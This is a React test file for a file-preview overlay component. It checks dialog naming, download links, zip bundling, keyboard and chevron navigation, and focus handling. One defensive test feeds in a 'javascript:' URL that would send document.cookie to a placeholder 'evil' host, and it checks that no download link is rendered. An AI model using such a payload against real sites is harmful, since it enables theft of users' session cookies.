import { createRef } from 'react';
import { render, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';
import { FilePreviewOverlay } from './FilePreviewOverlay';
import type { EvidenceItem } from '../../types/evidence';

const PIXEL = 'data:image/gif;base64,R0lGODlhAQABAAAAACw=';

const FILES: readonly EvidenceItem[] = [
  { label: 'socket_log.png', kind: 'image', url: PIXEL },
  { label: 'thread_dump.txt', kind: 'file', text: 'thread 1 waiting' },
  { label: 'cache_metrics.json', kind: 'file', text: '{"hits":12}' },
  { label: 'notes.md', kind: 'file', text: '# Cache notes' },
  { label: 'trace.zip', kind: 'file' },
  { label: 'screen_02.png', kind: 'image' },
];

const base = {
  files: FILES,
  activeIndex: 0,
  onActiveIndexChange: () => {},
  onClose: () => {},
};

function blobBytes(blob: Blob): Promise<Uint8Array> {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => resolve(new Uint8Array(reader.result as ArrayBuffer));
    reader.onerror = () => reject(reader.error);
    reader.readAsArrayBuffer(blob);
  });
}

describe('FilePreviewOverlay', () => {
  it('is not in the DOM when closed', () => {
    render(<FilePreviewOverlay {...base} open={false} />);
    expect(screen.queryByRole('dialog')).not.toBeInTheDocument();
  });

  it('keeps the shell mounted with minimal chrome when files is empty', () => {
    render(<FilePreviewOverlay {...base} files={[]} open />);
    expect(
      screen.getByRole('dialog', { name: 'File preview' }),
    ).toBeInTheDocument();
    expect(
      screen.getByRole('button', { name: 'Close preview' }),
    ).toBeInTheDocument();
    expect(screen.queryByRole('group')).not.toBeInTheDocument();
    expect(screen.queryByRole('link')).not.toBeInTheDocument();
  });

  it('fires onClosed after closing even if the files emptied while open', async () => {
    const onClosed = vi.fn();
    const { rerender } = render(
      <FilePreviewOverlay {...base} open onClosed={onClosed} />,
    );
    rerender(
      <FilePreviewOverlay {...base} files={[]} open onClosed={onClosed} />,
    );
    expect(screen.getByRole('dialog')).toBeInTheDocument();
    rerender(
      <FilePreviewOverlay
        {...base}
        files={[]}
        open={false}
        onClosed={onClosed}
      />,
    );
    await waitFor(() => expect(onClosed).toHaveBeenCalledTimes(1));
    expect(screen.queryByRole('dialog')).not.toBeInTheDocument();
  });

  it('renders a modal dialog named after the active file and position', () => {
    render(<FilePreviewOverlay {...base} open />);
    const dialog = screen.getByRole('dialog', {
      name: 'socket_log.png, file 1 of 6',
    });
    expect(dialog).toHaveAttribute('aria-modal', 'true');
    expect(screen.getByText('1 / 6')).toBeInTheDocument();
    expect(
      screen.getByRole('img', { name: 'socket_log.png' }),
    ).toBeInTheDocument();
  });

  it('offers a real download link for files with a url', () => {
    render(<FilePreviewOverlay {...base} open />);
    const link = screen.getByRole('link', { name: /download/i });
    expect(link).toHaveAttribute('href', PIXEL);
    expect(link).toHaveAttribute('download', 'socket_log.png');
  });

  it('offers a generated text download for files with only text', () => {
    render(<FilePreviewOverlay {...base} open activeIndex={1} />);
    const link = screen.getByRole('link', { name: /download/i });
    expect(link).toHaveAttribute(
      'href',
      `data:text/plain;charset=utf-8,${encodeURIComponent('thread 1 waiting')}`,
    );
    expect(link).toHaveAttribute('download', 'thread_dump.txt');
  });

  it('downloads the raw JSON text, not the pretty-printed preview', () => {
    render(<FilePreviewOverlay {...base} open activeIndex={2} />);
    expect(screen.getByRole('link', { name: /download/i })).toHaveAttribute(
      'href',
      `data:text/plain;charset=utf-8,${encodeURIComponent('{"hits":12}')}`,
    );
  });

  it('omits the download control for files without content', () => {
    render(<FilePreviewOverlay {...base} open activeIndex={4} />);
    expect(
      screen.queryByRole('link', { name: /download/i }),
    ).not.toBeInTheDocument();
  });

  it('omits the download control for a script-scheme url', () => {
    const evil: EvidenceItem = {
      label: 'rate_429.png',
      kind: 'image',
      url: 'javascript:fetch("//evil/"+document.cookie)',
    };
    render(<FilePreviewOverlay {...base} files={[evil]} open />);
    expect(
      screen.queryByRole('link', { name: /download/i }),
    ).not.toBeInTheDocument();
  });

  it('keeps the download control for a data: image url', () => {
    const dataImage: EvidenceItem = {
      label: 'chart.svg',
      kind: 'image',
      url: 'data:image/svg+xml;utf8,<svg/>',
    };
    render(<FilePreviewOverlay {...base} files={[dataImage]} open />);
    expect(screen.getByRole('link', { name: /download/i })).toHaveAttribute(
      'href',
      'data:image/svg+xml;utf8,<svg/>',
    );
  });

  it('bundles every file with content into one zip via Download all', async () => {
    const zipped: Blob[] = [];
    Object.defineProperty(URL, 'createObjectURL', {
      configurable: true,
      writable: true,
      value: vi.fn((blob: Blob) => {
        zipped.push(blob);
        return 'blob:zip';
      }),
    });
    Object.defineProperty(URL, 'revokeObjectURL', {
      configurable: true,
      writable: true,
      value: vi.fn(),
    });
    const downloaded: string[] = [];
    const clickSpy = vi
      .spyOn(HTMLAnchorElement.prototype, 'click')
      .mockImplementation(function (this: HTMLAnchorElement) {
        downloaded.push(this.getAttribute('download') ?? '');
      });

    render(<FilePreviewOverlay {...base} open />);
    await userEvent.click(
      screen.getByRole('button', { name: /download all/i }),
    );

    await waitFor(() => expect(downloaded).toEqual(['evidence.zip']));
    expect(zipped).toHaveLength(1);
    const bytes = await blobBytes(zipped[0]);
    const view = new DataView(bytes.buffer);
    // EOCD entry count: the 4 files with content, none of the empty ones
    expect(view.getUint16(bytes.length - 22 + 8, true)).toBe(4);
    const names = new TextDecoder().decode(bytes);
    expect(names).toContain('socket_log.png');
    expect(names).toContain('thread_dump.txt');
    expect(names).toContain('cache_metrics.json');
    expect(names).toContain('notes.md');
    expect(names).not.toContain('trace.zip');
    clickSpy.mockRestore();
  });

  it('names the zip from downloadAllName', async () => {
    Object.defineProperty(URL, 'createObjectURL', {
      configurable: true,
      writable: true,
      value: vi.fn(() => 'blob:zip'),
    });
    Object.defineProperty(URL, 'revokeObjectURL', {
      configurable: true,
      writable: true,
      value: vi.fn(),
    });
    const downloaded: string[] = [];
    const clickSpy = vi
      .spyOn(HTMLAnchorElement.prototype, 'click')
      .mockImplementation(function (this: HTMLAnchorElement) {
        downloaded.push(this.getAttribute('download') ?? '');
      });

    render(
      <FilePreviewOverlay
        {...base}
        open
        downloadAllName="TC-409-evidence.zip"
      />,
    );
    await userEvent.click(
      screen.getByRole('button', { name: /download all/i }),
    );

    await waitFor(() => expect(downloaded).toEqual(['TC-409-evidence.zip']));
    clickSpy.mockRestore();
  });

  it('hides Download all when fewer than two files have content', () => {
    render(<FilePreviewOverlay {...base} files={[FILES[0]]} open />);
    expect(
      screen.queryByRole('button', { name: /download all/i }),
    ).not.toBeInTheDocument();
  });

  it('navigates with the chevrons and clamps at both ends', async () => {
    const onActiveIndexChange = vi.fn();
    const { rerender } = render(
      <FilePreviewOverlay
        {...base}
        open
        onActiveIndexChange={onActiveIndexChange}
      />,
    );
    const prev = screen.getByRole('button', { name: 'Previous file' });
    expect(prev).toHaveAttribute('aria-disabled', 'true');
    await userEvent.click(prev);
    expect(onActiveIndexChange).not.toHaveBeenCalled();

    await userEvent.click(screen.getByRole('button', { name: 'Next file' }));
    expect(onActiveIndexChange).toHaveBeenCalledWith(1);

    rerender(
      <FilePreviewOverlay
        {...base}
        open
        activeIndex={5}
        onActiveIndexChange={onActiveIndexChange}
      />,
    );
    expect(screen.getByRole('button', { name: 'Next file' })).toHaveAttribute(
      'aria-disabled',
      'true',
    );
  });

  it('navigates with arrow keys and clamps at both ends', async () => {
    const onActiveIndexChange = vi.fn();
    const { rerender } = render(
      <FilePreviewOverlay
        {...base}
        open
        onActiveIndexChange={onActiveIndexChange}
      />,
    );
    await userEvent.keyboard('{ArrowLeft}');
    expect(onActiveIndexChange).not.toHaveBeenCalled();
    await userEvent.keyboard('{ArrowRight}');
    expect(onActiveIndexChange).toHaveBeenCalledWith(1);

    onActiveIndexChange.mockClear();
    rerender(
      <FilePreviewOverlay
        {...base}
        open
        activeIndex={5}
        onActiveIndexChange={onActiveIndexChange}
      />,
    );
    await userEvent.keyboard('{ArrowRight}');
    expect(onActiveIndexChange).not.toHaveBeenCalled();
    await userEvent.keyboard('{ArrowLeft}');
    expect(onActiveIndexChange).toHaveBeenCalledWith(4);
  });

  it('renders one filmstrip tile per file and marks the active one', async () => {
    const onActiveIndexChange = vi.fn();
    render(
      <FilePreviewOverlay
        {...base}
        open
        onActiveIndexChange={onActiveIndexChange}
      />,
    );
    const strip = screen.getByRole('group', { name: 'All files' });
    const tiles = within(strip).getAllByRole('button');
    expect(tiles).toHaveLength(6);
    expect(tiles[0]).toHaveAttribute('aria-current', 'true');
    expect(tiles[1]).not.toHaveAttribute('aria-current');
    expect(tiles[0].querySelector('img')).not.toBeNull();
    expect(tiles[1].querySelector('img')).toBeNull();
    expect(tiles[5].querySelector('img')).toBeNull();
    expect(
      tiles[1].querySelector('[data-icon-name="description"]'),
    ).not.toBeNull();
    expect(tiles[2].querySelector('[data-icon-name="code"]')).not.toBeNull();
    expect(
      tiles[4].querySelector('[data-icon-name="folder_zip"]'),
    ).not.toBeNull();
    expect(tiles[5].querySelector('[data-icon-name="image"]')).not.toBeNull();

    await userEvent.click(
      within(strip).getByRole('button', { name: 'cache_metrics.json' }),
    );
    expect(onActiveIndexChange).toHaveBeenCalledWith(2);
  });

  it('shows the text preview for the active text file', () => {
    render(<FilePreviewOverlay {...base} open activeIndex={2} />);
    expect(screen.getByText(/"hits": 12/)).toBeInTheDocument();
  });

  it('shows the fallback card for files without content', () => {
    render(<FilePreviewOverlay {...base} open activeIndex={4} />);
    expect(
      screen.getByText('No preview available for this file.'),
    ).toBeInTheDocument();
  });

  it('closes via Escape and via the close button', async () => {
    const onClose = vi.fn();
    render(<FilePreviewOverlay {...base} open onClose={onClose} />);
    await userEvent.keyboard('{Escape}');
    expect(onClose).toHaveBeenCalledTimes(1);
    await userEvent.click(
      screen.getByRole('button', { name: 'Close preview' }),
    );
    expect(onClose).toHaveBeenCalledTimes(2);
  });

  it('moves initial focus to the harmless close control, not Download all', async () => {
    render(<FilePreviewOverlay {...base} open />);
    await waitFor(() =>
      expect(
        screen.getByRole('button', { name: 'Close preview' }),
      ).toHaveFocus(),
    );
    expect(
      screen.getByRole('button', { name: /download all/i }),
    ).not.toHaveFocus();
  });

  it('forwards ref to the dialog panel and merges className', () => {
    const ref = createRef<HTMLDivElement>();
    render(
      <FilePreviewOverlay {...base} open ref={ref} className="custom-panel" />,
    );
    expect(ref.current).toHaveAttribute('role', 'dialog');
    expect(ref.current).toHaveClass('custom-panel');
  });

  it('restores focus to the previously focused element on close', async () => {
    const withOpener = (open: boolean) => (
      <>
        <button type="button">opener</button>
        <FilePreviewOverlay {...base} open={open} />
      </>
    );
    const { rerender } = render(withOpener(false));
    screen.getByRole('button', { name: 'opener' }).focus();
    rerender(withOpener(true));
    await waitFor(() =>
      expect(screen.getByRole('button', { name: 'opener' })).not.toHaveFocus(),
    );
    rerender(withOpener(false));
    expect(screen.getByRole('button', { name: 'opener' })).toHaveFocus();
  });
});
